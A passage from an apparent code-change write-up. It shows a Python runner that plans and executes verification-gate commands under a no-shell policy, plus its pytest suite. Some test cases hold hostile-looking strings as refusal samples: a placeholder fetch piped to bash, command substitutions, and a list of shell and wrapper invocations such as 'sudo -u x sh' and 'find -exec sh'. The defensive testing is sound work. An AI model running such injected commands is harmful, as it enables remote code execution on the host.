            names.add(_base(found))
    except _Refused as exc:
        return str(exc)
    except (OSError, ValueError):  # fail closed: a path that cannot be examined is not a pass
        return "the executable path could not be examined"
    if names & SHELL_NAMES or first in SHELL_RUNNERS:
        return "the executable is a shell; declare shell: true and pass --allow-shell"
    if first in WRAPPERS and any(_base(a) in SHELL_NAMES for a in argv[1:]):
        return "a wrapper is given a shell; declare shell: true and pass --allow-shell"
    return None


def plan_gate(gate: Gate, ws: Workspace, allow_shell: bool) -> Plan | str:
    """The spawn plan, or the policy-error reason. Nothing here spawns."""
    try:
        if gate.shell:
            raw = gate.command or ""
            if not raw.strip():
                return "empty command"
            if len(raw) > MAX_TEXT_CHARS:
                return "command is too long"
            if not allow_shell:
                return "shell gate refused: pass --allow-shell"
            if os.name != "posix":
                return "shell gates need a POSIX shell"
            argv: tuple[str, ...] = (SHELL_PATH, "-c", raw)
            line = raw
        else:
            parsed = _argv_from_string(gate.command) if gate.command is not None else gate.argv
            if isinstance(parsed, str):
                return parsed
            argv = parsed or ()
            line = shlex.join(argv)
        refusal = _argv_refusal(argv)
        if refusal is not None:
            return refusal
        try:
            cwd = ws.check_read(gate.cwd)
        except SandboxDenied as exc:
            return f"cwd refused ({exc.reason})"
        if not cwd.is_dir():
            return "cwd is not a folder"
        if not gate.shell:  # needs the gate's cwd: the child resolves argv[0] from there
            refusal = _shell_refusal(argv, cwd)
            if refusal is not None:
                return refusal
        # the same guard the agent loop uses: command rules plus the sensitive-path rule on cwd
        denial = guard_tool_call(ToolCall("gate", "gate", {"command": line, "cwd": str(cwd)}))
        if denial is not None:
            return denial
        return Plan(argv, cwd)
    except Exception:  # noqa: BLE001 - fail closed: an unexpected error is a refusal
        return "policy check failed"


def _tail(text: str) -> tuple[str, bool]:
    cleaned = redact_secrets(text)[0]
    return cleaned[-TAIL_CHARS:], len(cleaned) > TAIL_CHARS


def _run_one(gate: Gate, plan: Plan, timeout_s: float) -> GateResult:
    start = time.monotonic()

    def done(
        status: Status,
        code: int | None,
        message: str,
        out: str = "",
        err: str = "",
        truncated: bool = False,
    ) -> GateResult:
        elapsed = round(time.monotonic() - start, 3)
        return GateResult(gate.id, status, code, elapsed, out, err, truncated, message)

    try:
        res = collect(
            stream_process(plan.argv, env=scrubbed_env(), timeout_s=timeout_s, cwd=str(plan.cwd))
        )
    except FileNotFoundError:
        return done("error", None, "executable or folder not found")
    except PermissionError:
        return done("error", None, "not executable or not permitted")
    except Exception as exc:  # noqa: BLE001 - a spawn failure is an error, never a pass
        return done("error", None, f"could not start ({type(exc).__name__})")
    out, cut_out = _tail(res.stdout)
    err, cut_err = _tail(res.stderr)
    cut = res.truncated or cut_out or cut_err
    if res.timed_out:
        return done("timeout", None, f"timed out after {timeout_s:g}s", out, err, cut)
    if res.exit_code is None:
        return done("error", None, "no exit status", out, err, cut)
    if res.exit_code == 0:
        return done("pass", 0, "", out, err, cut)
    why = (
        f"killed by signal {-res.exit_code}" if res.exit_code < 0 else f"exit code {res.exit_code}"
    )
    return done("fail", res.exit_code, why, out, err, cut)


def _skipped(gate_id: str, status: Status, message: str) -> GateResult:
    return GateResult(gate_id, status, None, 0.0, "", "", False, message)


def _report(results: Sequence[GateResult]) -> GateReport:
    passed = sum(r.status == "pass" for r in results)
    total = len(results)
    return GateReport(tuple(results), passed, total - passed, total, total > 0 and passed == total)


def run_gates(
    gates: Sequence[Gate],
    ws: Workspace,
    *,
    allow_shell: bool = False,
    total_s: float = MAX_TOTAL_S,
) -> GateReport:
    """Check every gate first; spawn nothing if any is refused. Then run all, in order."""
    if not gates:
        raise ValueError("no gates to run")
    plans = [plan_gate(g, ws, allow_shell) for g in gates]
    ready = [p for p in plans if isinstance(p, Plan)]
    if len(ready) != len(plans):  # nothing is spawned when any gate is refused
        return _report(
            [
                (
                    _skipped(g.id, "policy-error", p)
                    if isinstance(p, str)
                    else _skipped(g.id, "not-run", "another gate was refused")
                )
                for g, p in zip(gates, plans, strict=True)
            ]
        )
    deadline = time.monotonic() + total_s
    results: list[GateResult] = []
    for g, p in zip(gates, ready, strict=True):
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            results.append(_skipped(g.id, "not-run", "time budget used up"))
        else:
            results.append(_run_one(g, p, min(g.timeout_s, remaining)))
    return _report(results)


def exit_code(report: GateReport) -> int:
    if report.ok:
        return 0
    return 2 if any(r.status == "policy-error" for r in report.gates) else 1


def _emit(text: str) -> bool:
    try:
        print(text)
        sys.stdout.flush()
    except Exception:  # noqa: BLE001 - stdout lost: the caller still exits 2, never 0 or 1
        return False
    return True


def _raise_exit(signum: int, _frame: object) -> None:
    raise SystemExit(128 + signum)


@contextlib.contextmanager
def _signals_raise() -> Iterator[None]:
    """SIGTERM (a CI cancel) and SIGHUP (a closed terminal) unwind like Ctrl-C, so stream_process
    kills the gate's process group instead of leaving it running. SIGKILL cannot be handled: that
    one still orphans a gate."""
    saved: list[tuple[int, Any]] = []
    try:
        for sig in HANDLED_SIGNALS:
            saved.append((sig, signal.signal(sig, _raise_exit)))
    except ValueError:  # not the main thread: leave the handlers alone
        pass
    try:
        yield
    finally:
        for old_sig, previous in saved:  # None = installed from C: SIG_DFL is the closest restore
            signal.signal(old_sig, signal.SIG_DFL if previous is None else previous)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(prog="master_finhub.evals.gates")
    ap.add_argument("gate_file")
    ap.add_argument("--root", default=None, help="workspace fence for gate cwd (default: cwd)")
    ap.add_argument(
        "--allow-shell",
        action="store_true",
        help="honour shell: true gates (a convention for the string form; the shell refusal is a speed bump with known gaps, not a sandbox: see the module docstring)",
    )
    args = ap.parse_args(argv)
    try:
        with _signals_raise():
            gates = load_gate_file(args.gate_file)
            ws = Workspace(args.root if args.root is not None else os.getcwd())
            report = run_gates(gates, ws, allow_shell=args.allow_shell)
    except (GateFileError, FileNotFoundError, NotADirectoryError) as exc:
        return 2 if _emit(str(exc)) else _stdout_lost()
    except Exception as exc:  # noqa: BLE001 - any other failure is exit 2, never 0 or 1
        return 2 if _emit(f"Gates could not run ({type(exc).__name__}).") else _stdout_lost()
    out = {"schema_version": SCHEMA_VERSION, "kind": "gates", **asdict(report)}
    code = exit_code(report)
    return code if _emit(json.dumps(out, indent=2)) else _stdout_lost()


if __name__ == "__main__":
    raise SystemExit(main())
```

### B. `src/master_finhub/sandbox/stream.py` (the only existing source file touched)

```diff
diff --git a/src/master_finhub/sandbox/stream.py b/src/master_finhub/sandbox/stream.py
index 939dd24..5c2c458 100644
--- a/src/master_finhub/sandbox/stream.py
+++ b/src/master_finhub/sandbox/stream.py
@@ -121,9 +121,12 @@ def stream_process(
     env: Mapping[str, str],
     timeout_s: float,
     on_timeout: Callable[[], None] | None = None,
+    cwd: str | None = None,
 ) -> Iterator[Chunk]:
     """Run ``argv`` (no shell) and yield output chunks, then ``exit`` or ``timeout``.
 
+    ``cwd`` goes to Popen unchanged: the caller fences it (see ``evals/gates.py``).
+
     Closing the generator early kills the process group, calls ``on_timeout`` and releases both
     reader threads (daemon threads; pipes closed only once their reader has finished).
     """
@@ -131,6 +134,7 @@ def stream_process(
     proc = subprocess.Popen(
         list(argv),
         env=dict(env),
+        cwd=cwd,
         stdin=subprocess.DEVNULL,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
```

Existing callers pass no `cwd`, so `Popen` gets `cwd=None` (the old behaviour); `test_stream_process_cwd_defaults_to_the_current_folder_and_can_be_set` pins both the default and the new use, mutants S01, S06, S14, S15 die.

### C. `tests/test_gates.py` (new, 2492 lines, 172 test functions, 677 cases with the matrix, in full)

```python
"""C9 proof tests: verification gates as data, argv only, a shell only if declared and allowed.

Synthetic commands only. Real processes run `python -c` snippets. Nothing here deletes, writes outside tmp_path or uses the
network. Fake credentials are assembled at runtime so no complete token shape is committed.
"""

from __future__ import annotations

import json
import os
import random
import shlex
import shutil
import signal
import subprocess
import sys
import time
import types
from pathlib import Path
from typing import Any, Self

import gate_matrix
import pytest

from master_finhub.evals import gates as gm
from master_finhub.evals import runner
from master_finhub.evals.gates import (
    Gate,
    GateFileError,
    GateReport,
    GateResult,
    Plan,
    exit_code,
    load_gate_file,
    main,
    plan_gate,
    run_gates,
)
from master_finhub.sandbox.stream import ExecResult, collect, stream_process
from master_finhub.sandbox.workspace import Workspace

PY = sys.executable
SRC = Path(__file__).parent.parent / "src"
ANT = "sk-ant-" + "FAKE0" * 5  # a secret shape (synthetic)


def G(
    id: str = "g1",
    *,
    command: str | None = None,
    argv: tuple[str, ...] | None = None,
    shell: bool = False,
    timeout_s: float = 30.0,
    cwd: str = ".",
) -> Gate:
    return Gate(id, command, argv, shell, timeout_s, cwd)


def P(code: str, id: str = "g1", **kw: Any) -> Gate:
    """A gate that runs `python -c <code>`."""
    return G(id, argv=(PY, "-c", code), **kw)


def run(tmp_path: Path, gates: list[Gate], **kw: Any) -> GateReport:
    return run_gates(gates, Workspace(tmp_path), **kw)


def statuses(report: GateReport) -> list[str]:
    return [r.status for r in report.gates]


class Spy:
    """Records every Popen call. With block=True a spawn raises, so a test can prove none happens."""

    def __init__(self, real: Any) -> None:
        self.real, self.calls, self.block = real, [], False

    def __call__(self, *a: Any, **k: Any) -> Any:
        self.calls.append((a, k))
        if self.block:
            raise AssertionError("a spawn was attempted")
        return self.real(*a, **k)


@pytest.fixture
def spy(monkeypatch: pytest.MonkeyPatch) -> Spy:
    s = Spy(subprocess.Popen)
    monkeypatch.setattr(subprocess, "Popen", s)

    def boom(*a: Any, **k: Any) -> Any:
        raise AssertionError("only Popen with an argv list may be used")

    for name in ("run", "call", "check_call", "check_output"):
        monkeypatch.setattr(subprocess, name, boom)
    for name in ("system", "popen", "execv", "execvp", "posix_spawn", "spawnv"):
        monkeypatch.setattr(os, name, boom, raising=False)
    return s


def doc(*rows: Any, **top: Any) -> dict[str, Any]:
    return {"schema_version": 1, "gates": list(rows), **top}


def write(tmp_path: Path, obj: Any) -> Path:
    p = tmp_path / "gates.json"
    p.write_text(json.dumps(obj))
    return p


def write_raw(tmp_path: Path, data: bytes) -> Path:
    p = tmp_path / "gates.json"
    p.write_bytes(data)
    return p


def cli(*args: str, cwd: Path | None = None, **env: str) -> subprocess.CompletedProcess[str]:
    full = {**os.environ, "PYTHONPATH": str(SRC), **env}
    return subprocess.run(
        [PY, "-m", "master_finhub.evals.gates", *args],
        capture_output=True, text=True, env=full, check=False, timeout=120, cwd=cwd,
    )  # fmt: skip


OK = {"id": "a", "command": "pytest -q"}

# --- proof (backlog row C9) -------------------------------------------------------------


def test_proof_plain_string_runs_as_argv(tmp_path: Path, spy: Spy) -> None:
    cmd = f"{PY} -c 'print(7)'"  # no metacharacter: shlex gives argv, no shell
    report = run(tmp_path, [G(command=cmd)])
    assert statuses(report) == ["pass"] and report.gates[0].stdout_tail == "7\n"
    (args, kwargs), *rest = spy.calls
    assert not rest and args[0] == [PY, "-c", "print(7)"]
    assert not kwargs.get("shell", False)


def test_proof_metachar_is_a_policy_error_and_nothing_spawns(tmp_path: Path, spy: Spy) -> None:
    spy.block = True
    marker = tmp_path / "ran"
    report = run(tmp_path, [G(command=f"{PY} -V; touch {marker}")])
    assert statuses(report) == ["policy-error"] and "metacharacters" in report.gates[0].message
    assert spy.calls == [] and not marker.exists() and exit_code(report) == 2


def test_proof_shell_true_only_when_declared_and_allowed(tmp_path: Path, spy: Spy) -> None:
    line = "echo a && echo b"
    refused = run(tmp_path, [G(command=line)])  # not declared: metacharacters are an error
    assert statuses(refused) == ["policy-error"] and spy.calls == []
    no_flag = run(tmp_path, [G(command=line, shell=True)])  # declared, caller did not allow
    assert statuses(no_flag) == ["policy-error"] and spy.calls == []
    ok = run(tmp_path, [G(command=line, shell=True)], allow_shell=True)
    assert statuses(ok) == ["pass"] and ok.gates[0].stdout_tail == "a\nb\n"
    assert spy.calls[0][0][0] == ["/bin/sh", "-c", line]


def test_proof_timeout_is_timeout_never_pass(tmp_path: Path) -> None:
    start = time.monotonic()
    report = run(tmp_path, [P("import time; time.sleep(30)", timeout_s=0.5)])
    assert statuses(report) == ["timeout"] and report.gates[0].exit_code is None
    assert time.monotonic() - start < 10 and not report.ok and exit_code(report) == 1


# --- the file: strict schema ------------------------------------------------------------


def test_good_file_loads_exactly(tmp_path: Path) -> None:
    p = write(
        tmp_path,
        doc(
            OK,
            {"id": "b.2_x-y", "argv": ["ruff", "check"], "timeout_s": 5, "cwd": "sub"},
            {"id": "c", "command": "cd x && y", "shell": True, "timeout_s": 1800.0},
        ),
    )
    a, b, c = load_gate_file(p)
    assert a == Gate("a", "pytest -q", None, False, 300.0, ".")
    assert b == Gate("b.2_x-y", None, ("ruff", "check"), False, 5.0, "sub")
    assert isinstance(b.timeout_s, float)
    assert c == Gate("c", "cd x && y", None, True, 1800.0, ".")


def long_id(n: int) -> str:
    return "a" * n


BAD_DOCS: dict[str, Any] = {
    "empty-list": doc(),
    "gates-null": {"schema_version": 1, "gates": None},
    "gates-missing": {"schema_version": 1},
    "gates-object": {"schema_version": 1, "gates": {"a": OK}},
    "gates-number": {"schema_version": 1, "gates": 5},
    "gates-true": {"schema_version": 1, "gates": True},
    "gates-string": {"schema_version": 1, "gates": "pytest -q"},
    "root-list": [OK],
    "root-null": None,
    "root-unknown-key": doc(OK, extra=1),
    "version-missing": {"gates": [OK]},
    "version-2": doc(OK, schema_version=2),
    "version-0": doc(OK, schema_version=0),
    "version-true": doc(OK, schema_version=True),
    "version-float": doc(OK, schema_version=1.0),
    "version-str": doc(OK, schema_version="1"),
    "gate-not-object": doc("pytest -q"),
    "gate-null": doc(None),
    "gate-unknown-key": doc({**OK, "env": {"A": "b"}}),
    "id-missing": doc({"command": "x"}),
    "id-empty": doc({"id": "", "command": "x"}),
    "id-space": doc({"id": "a b", "command": "x"}),
    "id-leading-space": doc({"id": " a", "command": "x"}),
    "id-leading-dash": doc({"id": "-a", "command": "x"}),
    "id-leading-dot": doc({"id": ".a", "command": "x"}),
    "id-slash": doc({"id": "../a", "command": "x"}),
    "id-inner-slash": doc({"id": "a/b", "command": "x"}),
    "id-backslash": doc({"id": "a\\b", "command": "x"}),
    "id-colon": doc({"id": "a:b", "command": "x"}),
    "id-semicolon": doc({"id": "a;b", "command": "x"}),
    "id-inner-newline": doc({"id": "a\nb", "command": "x"}),
    "id-non-ascii": doc({"id": "caf\u00e9", "command": "x"}),
    "id-arabic-digit": doc({"id": "\u0663a", "command": "x"}),
    "id-65-chars": doc({"id": long_id(65), "command": "x"}),
    "id-number": doc({"id": 1, "command": "x"}),
    "id-newline": doc({"id": "a\n", "command": "x"}),
    "duplicate-id": doc(OK, {"id": "b", "command": "x"}, {"id": "a", "argv": ["x"]}),
    "both-command-and-argv": doc({"id": "a", "command": "x", "argv": ["x"]}),
    "neither-command-nor-argv": doc({"id": "a"}),
    "command-null-argv-null": doc({"id": "a", "command": None, "argv": None}),
    "command-number": doc({"id": "a", "command": 5}),
    "command-list": doc({"id": "a", "command": ["x"]}),
    "argv-string": doc({"id": "a", "argv": "pytest -q"}),
    "argv-number-item": doc({"id": "a", "argv": ["x", 1]}),
    "argv-nested": doc({"id": "a", "argv": [["x"]]}),
    "argv-null-item": doc({"id": "a", "argv": ["x", None]}),
    "shell-string": doc({"id": "a", "command": "x", "shell": "yes"}),
    "shell-false-string": doc({"id": "a", "command": "x", "shell": "false"}),
    "shell-one": doc({"id": "a", "command": "x", "shell": 1}),
    "shell-null": doc({"id": "a", "command": "x", "shell": None}),
    "shell-with-argv": doc({"id": "a", "argv": ["x"], "shell": True}),
    "timeout-zero": doc({"id": "a", "command": "x", "timeout_s": 0}),
    "timeout-negative": doc({"id": "a", "command": "x", "timeout_s": -1}),
    "timeout-1800-5": doc({"id": "a", "command": "x", "timeout_s": 1800.5}),
    "timeout-1801": doc({"id": "a", "command": "x", "timeout_s": 1801}),
    "timeout-true": doc({"id": "a", "command": "x", "timeout_s": True}),
    "timeout-string": doc({"id": "a", "command": "x", "timeout_s": "5"}),
    "timeout-null": doc({"id": "a", "command": "x", "timeout_s": None}),
    "timeout-huge-float": doc({"id": "a", "command": "x", "timeout_s": 1e999}),
    "timeout-huge-int": doc({"id": "a", "command": "x", "timeout_s": 10**400}),
    "cwd-number": doc({"id": "a", "command": "x", "cwd": 5}),
    "cwd-null": doc({"id": "a", "command": "x", "cwd": None}),
    "too-many-gates": doc(*({"id": f"g{i}", "command": "x"} for i in range(51))),
}


@pytest.mark.parametrize("name", list(BAD_DOCS))
def test_bad_file_is_refused_and_exit_2(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, spy: Spy, name: str
) -> None:
    spy.block = True
    p = write(tmp_path, BAD_DOCS[name])
    with pytest.raises(GateFileError):
        load_gate_file(p)
    assert main([str(p), "--root", str(tmp_path)]) == 2
    out = capsys.readouterr().out
    assert out.startswith("Gate file: ") and not out.lstrip().startswith("{")
    assert spy.calls == []


RAW_BAD = {
    "nan": b'{"schema_version":1,"gates":[{"id":"a","command":"x","timeout_s":NaN}]}',
    "infinity": b'{"schema_version":1,"gates":[{"id":"a","command":"x","timeout_s":Infinity}]}',
    "minus-infinity": b'{"schema_version":1,"gates":[{"id":"a","command":"x","timeout_s":-Infinity}]}',
    "duplicate-root-key": b'{"schema_version":1,"schema_version":1,"gates":[{"id":"a","command":"x"}]}',
    "duplicate-gate-key": b'{"schema_version":1,"gates":[{"id":"a","command":"x","command":"y"}]}',
    "bom": b'\xef\xbb\xbf{"schema_version":1,"gates":[{"id":"a","command":"x"}]}',
    "invalid-utf8": b'{"schema_version":1,"gates":[{"id":"a","command":"\xff\xfe"}]}',
    "latin1": b'{"schema_version":1,"gates":[{"id":"a","command":"caf\xe9"}]}',
    "empty-file": b"",
    "truncated": b'{"schema_version":1,"gates":[{"id":"a","comm',
    "trailing-comma": b'{"schema_version":1,"gates":[{"id":"a","command":"x"},]}',
    "yaml": b"schema_version: 1\ngates:\n  - id: a\n",
    "deep-nesting": b"[" * 250_000,
    "deep-nesting-object": b'{"schema_version":1,"gates":' + b"[" * 250_000,
    "huge-int-digits": b'{"schema_version":1,"gates":[{"id":"a","command":"x","timeout_s":'
    + b"1" * 5000
    + b"}]}",
}


@pytest.mark.parametrize("name", list(RAW_BAD))
def test_bad_raw_file_is_refused(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, spy: Spy, name: str
) -> None:
    spy.block = True
    p = write_raw(tmp_path, RAW_BAD[name])
    with pytest.raises(GateFileError):
        load_gate_file(p)
    assert main([str(p), "--root", str(tmp_path)]) == 2
    assert capsys.readouterr().out.startswith("Gate file: ")
    assert spy.calls == []


def test_empty_gate_list_exit_2_nothing_runs(
    capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    assert main([str(write(tmp_path, doc())), "--root", str(tmp_path)]) == 2
    assert '"gates" must be a non-empty list' in capsys.readouterr().out


def test_run_gates_refuses_an_empty_list(tmp_path: Path, spy: Spy) -> None:
    with pytest.raises(ValueError):
        run(tmp_path, [])
    assert spy.calls == []


def test_gate_count_boundary(tmp_path: Path) -> None:
    fifty = doc(*({"id": f"g{i}", "command": "x"} for i in range(50)))
    assert len(load_gate_file(write(tmp_path, fifty))) == 50
    one = doc({"id": "only", "command": "x"})
    assert len(load_gate_file(write(tmp_path, one))) == 1


def test_file_size_boundary(tmp_path: Path) -> None:
    body = json.dumps(doc(OK)).encode()
    at_cap = body + b" " * (gm.MAX_FILE_BYTES - len(body))
    assert len(load_gate_file(write_raw(tmp_path, at_cap))) == 1
    with pytest.raises(GateFileError, match="larger than"):
        load_gate_file(write_raw(tmp_path, at_cap + b" "))


def test_file_size_cap_applies_before_parsing(tmp_path: Path) -> None:
    p = write_raw(tmp_path, b"[" * 5_000_000)  # 5 MB: refused on size, never parsed
    start = time.monotonic()
    with pytest.raises(GateFileError, match="larger than"):
        load_gate_file(p)
    assert time.monotonic() - start < 2


@pytest.mark.parametrize("kind", ["missing", "directory"])
def test_missing_or_directory_gate_file_exit_2(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, kind: str
) -> None:
    target = tmp_path / ("nope.json" if kind == "missing" else "")
    assert main([str(target), "--root", str(tmp_path)]) == 2
    assert "not a regular file" in capsys.readouterr().out


@pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs os.mkfifo")
def test_fifo_gate_file_is_refused_without_blocking(tmp_path: Path) -> None:
    fifo = tmp_path / "gates.json"
    os.mkfifo(fifo)
    with pytest.raises(GateFileError, match="not a regular file"):
        load_gate_file(fifo)


def test_unreadable_gate_file_exit_2(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    p = write(tmp_path, doc(OK))

    def deny(*a: Any, **k: Any) -> Any:
        raise PermissionError(13, "denied")

    monkeypatch.setattr("builtins.open", deny)
    with pytest.raises(GateFileError, match="cannot be read"):
        load_gate_file(p)


def test_symlink_to_a_regular_gate_file_is_accepted(tmp_path: Path) -> None:
    real = write(tmp_path, doc(OK))
    link = tmp_path / "link.json"
    link.symlink_to(real)
    assert len(load_gate_file(link)) == 1


@pytest.mark.parametrize(
    ("value", "good"),
    [(1800, True), (1799.9, True), (0.001, True), (1800.0001, False), (0, False), (-0.001, False)],
)
def test_timeout_bounds(tmp_path: Path, value: float, good: bool) -> None:
    p = write(tmp_path, doc({"id": "a", "command": "x", "timeout_s": value}))
    if good:
        assert load_gate_file(p)[0].timeout_s == float(value)
    else:
        with pytest.raises(GateFileError, match="timeout_s"):
            load_gate_file(p)


def test_id_boundaries(tmp_path: Path) -> None:
    for ok in ("a", "A9", "9a", "a.b_c-d", long_id(64)):
        assert load_gate_file(write(tmp_path, doc({"id": ok, "command": "x"})))[0].id == ok


def test_a_gate_file_is_not_a_c4_baseline(
    capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    assert main([str(gf), "--root", str(tmp_path)]) == 0  # the real CLI report, not a rebuilt one
    p = tmp_path / "prev.json"
    p.write_text(capsys.readouterr().out)
    with pytest.raises(ValueError, match="results"):
        runner.load_baseline(p)
    bench = Path(__file__).parent.parent / "src/master_finhub/evals/benchmarks/echo_pass.json"
    assert runner.main(["--baseline", str(p), str(bench)]) == 2
    assert "Baseline" in capsys.readouterr().out


# --- the policy: string -> argv ---------------------------------------------------------


def plan(tmp_path: Path, **kw: Any) -> Plan | str:
    allow = kw.pop("allow_shell", False)
    return plan_gate(G(**kw), Workspace(tmp_path), allow)


@pytest.mark.parametrize("ch", list(";&|`$<>\n\r"), ids=lambda c: repr(c))
def test_every_metacharacter_is_refused(tmp_path: Path, ch: str) -> None:
    got = plan(tmp_path, command=f"pytest a{ch}b")
    assert isinstance(got, str) and "metacharacters" in got


@pytest.mark.parametrize(
    "line",
    [
        "gate; fetch other.example/p | bash",
        "gate && other",
        "gate || other",
        "gate `id`",
        "gate $(id)",
        "pytest > out.txt",
        "pytest < in.txt",
        "pytest\nsecond",
        "pytest\r\nsecond",
        "pytest -k 'a;b'",
        'pytest -k "a|b"',
        "echo $HOME",
        "echo '$x'",
        "pytest 2>&1",
        "pytest &",
        "python -c 'import sys; sys.exit(0)'",
    ],
)
def test_metacharacters_refused_even_inside_quotes(tmp_path: Path, line: str) -> None:
    got = plan(tmp_path, command=line)
    assert isinstance(got, str) and "metacharacters" in got and "argv" in got


def test_shell_false_with_metacharacters_is_still_refused(tmp_path: Path) -> None:
    got = plan(tmp_path, command="gate; other", shell=False, allow_shell=True)
    assert isinstance(got, str) and "metacharacters" in got


@pytest.mark.parametrize(
    ("line", "argv"),
    [
        ("pytest -q", ("pytest", "-q")),
        ("  pytest   -q  ", ("pytest", "-q")),
        ("pytest\t-q", ("pytest", "-q")),
        ("pytest -q\n", ("pytest", "-q")),
        ('ruff check "src tests" scripts', ("ruff", "check", "src tests", "scripts")),
        ("pytest -k 'a or b'", ("pytest", "-k", "a or b")),
        ("pytest tests/test_*.py", ("pytest", "tests/test_*.py")),  # globs stay literal
        ("ls ~", ("ls", "~")),  # no tilde expansion
        ("echo (x)", ("echo", "(x)")),
        ("echo {a,b}", ("echo", "{a,b}")),
        ("pytest # c", ("pytest", "#", "c")),  # no comment handling
        ("pytest -k a=b", ("pytest", "-k", "a=b")),
        ('echo "" x', ("echo", "", "x")),
        ("echo \u00e9\u00e8", ("echo", "\u00e9\u00e8")),
        (r"python C:\x\y.py", ("python", "C:xy.py")),  # POSIX backslash escape, pinned
        ("x" * 4096, ("x" * 4096,)),
    ],
)
def test_plain_strings_become_argv(tmp_path: Path, line: str, argv: tuple[str, ...]) -> None:
    got = plan(tmp_path, command=line)
    assert isinstance(got, Plan) and got.argv == argv


@pytest.mark.parametrize(
    ("line", "why"),
    [
        ("", "empty command"),
        ("   ", "empty command"),
        ("\t \t", "empty command"),
        ("pytest 'a", "could not tokenize"),
        ('pytest "a', "could not tokenize"),
        ("pytest a\\", "could not tokenize"),
        ('"" x', "empty executable"),
        ("''", "empty executable"),
        ("-q pytest", "starts with '-'"),
        ("--version", "starts with '-'"),
        ("A=b pytest", "contains '='"),
        ("PATH=x python", "contains '='"),
        ("pytest\x00x", "NUL"),
        ("x" * 4097, "too long"),
        ("pytest " + "a" * 4090, "too long"),
    ],
)
def test_plain_strings_refused(tmp_path: Path, line: str, why: str) -> None:
    got = plan(tmp_path, command=line)
    assert isinstance(got, str) and why in got, got


def test_command_length_boundary(tmp_path: Path) -> None:
    ok = "pytest " + "a" * (4096 - 7)
    assert isinstance(plan(tmp_path, command=ok), Plan)
    assert plan(tmp_path, command=ok + "a") == "command is too long"


@pytest.mark.parametrize("n", [1, 256])
def test_argv_item_count_accepted(tmp_path: Path, n: int) -> None:
    got = plan(tmp_path, argv=("echo",) * n)
    assert isinstance(got, Plan) and len(got.argv) == n


def test_argv_item_count_limit(tmp_path: Path) -> None:
    assert plan(tmp_path, argv=("echo",) * 257) == "argv is too long"


def test_argv_item_length_boundary(tmp_path: Path) -> None:
    assert isinstance(plan(tmp_path, argv=("echo", "a" * 4096)), Plan)
    assert plan(tmp_path, argv=("echo", "a" * 4097)) == "argv is too long"


def test_huge_argv_is_refused_by_the_guard_cap(tmp_path: Path) -> None:
    got = plan(tmp_path, argv=("echo",) + ("a" * 4096,) * 255)
    assert isinstance(got, str) and "too-long" in got


def test_argv_form_is_verbatim(tmp_path: Path) -> None:
    items = (PY, "-c", "import sys; print($HOME `x` | > <)", "a b", "", "~", "*")
    got = plan(tmp_path, argv=items)
    assert isinstance(got, Plan) and got.argv == items


@pytest.mark.parametrize(
    ("argv", "why"),
    [
        ((), "empty command"),
        (("",), "empty executable"),
        (("", "x"), "empty executable"),
        (("-x",), "starts with '-'"),
        (("A=b", "x"), "contains '='"),
        (("pytest", "a\x00b"), "NUL"),
        (("pytest", "\ud800"), "not valid text"),
        (("pytest", chr(0xDCFF)), "not valid text"),
    ],
)
def test_argv_form_refused(tmp_path: Path, argv: tuple[str, ...], why: str) -> None:
    got = plan(tmp_path, argv=argv)
    assert isinstance(got, str) and why in got, got


def test_later_argument_may_start_with_dash_and_contain_equals(tmp_path: Path) -> None:
    got = plan(tmp_path, argv=("pytest", "-q", "--maxfail=1", "a=b"))
    assert isinstance(got, Plan)


# --- shell gates -------------------------------------------------------------------------


def test_shell_gate_plan_is_sh_dash_c(tmp_path: Path) -> None:
    got = plan(tmp_path, command="cd x && y", shell=True, allow_shell=True)
    assert isinstance(got, Plan) and got.argv == ("/bin/sh", "-c", "cd x && y")


# --- a shell is not a non-shell gate ------------------------------------------------------------

SHELL_FORMS = [
    ("argv", ("sh", "-c", "echo A; echo B > out.txt && echo $0")),
    ("argv", ("bash", "-c", "echo $HOME > f")),
    ("argv", ("bash", "--noprofile", "-c", "a;b")),
    ("argv", ("/bin/sh", "-c", "id && id")),
    ("argv", ("/usr/bin/env", "bash")),
    ("argv", ("dash", "-c", "a;b")),
    ("argv", ("zsh", "-c", "a;b")),
    ("argv", ("ksh", "-c", "a")),
    ("argv", ("fish", "-c", "a")),
    ("argv", ("csh", "-c", "a")),
    ("argv", ("tcsh", "-c", "a")),
    ("argv", ("ash", "-c", "a")),
    ("argv", ("mksh", "-c", "a")),
    ("argv", ("rbash", "-c", "a")),
    ("argv", ("BASH", "-c", "a")),
    ("argv", ("Sh", "-c", "a")),
    ("argv", ("bash.exe", "-c", "a")),
    ("argv", ("C:/tools/SH.EXE", "-c", "a")),
    ("argv", ("./sh", "-c", "a")),
    ("argv", ("env", "sh", "-c", "a;b")),
    ("argv", ("env", "A=1", "bash")),
    ("argv", ("busybox", "sh", "-c", "a;b")),
    ("argv", ("xargs", "-I{}", "sh", "-c", "{}")),
    ("argv", ("find", ".", "-exec", "sh", "-c", "a;b", "{}", ";")),
    ("argv", ("find", ".", "-execdir", "/bin/bash", "-c", "a", ";")),
    ("argv", ("nohup", "sh", "-c", "a")),
    ("argv", ("exec", "bash")),
    ("argv", ("command", "sh")),
    ("argv", ("sudo", "-u", "x", "sh")),
    ("argv", ("timeout", "5", "sh", "-c", "a")),
    ("argv", ("nice", "-n", "5", "bash")),
    ("argv", ("setsid", "sh")),
    ("argv", ("su", "-c", "a;b")),
    ("argv", ("su",)),
    ("argv", ("watch", "ls")),
    ("string", "sh -c id"),
    ("string", "bash -c ls"),
    ("string", "/bin/sh -c id"),
    ("string", "env sh"),
    ("string", "'sh' -c id"),
    ("string", "  dash  "),
]


@pytest.mark.parametrize("form, value", SHELL_FORMS, ids=lambda v: str(v)[:40])
def test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate(
    tmp_path: Path, form: str, value: Any
) -> None:
    kw = {"argv": value} if form == "argv" else {"command": value}
    got = plan(tmp_path, **kw)
    assert isinstance(got, str) and "shell" in got and "--allow-shell" in got


